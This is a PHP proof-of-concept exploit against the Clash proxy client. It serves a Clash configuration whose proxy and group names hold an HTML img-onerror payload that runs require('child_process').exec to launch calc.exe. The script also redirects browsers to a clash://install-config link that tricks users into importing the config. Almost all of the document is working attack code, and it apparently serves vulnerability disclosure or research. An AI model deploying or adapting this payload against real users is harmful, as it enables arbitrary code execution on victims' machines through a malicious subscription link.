<?php 
$poc = 'port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>';

$head = getallheaders();
$str = join($head);
if (strstr($str, 'Clash')) {
	echo $poc;
} else {
	// echo "哎呀呀！这是Clash的配置文件啦。不能用浏览器直接访问。";
  header('Location: clash://install-config?url=http://127.0.0.1/clash.php');
}

?>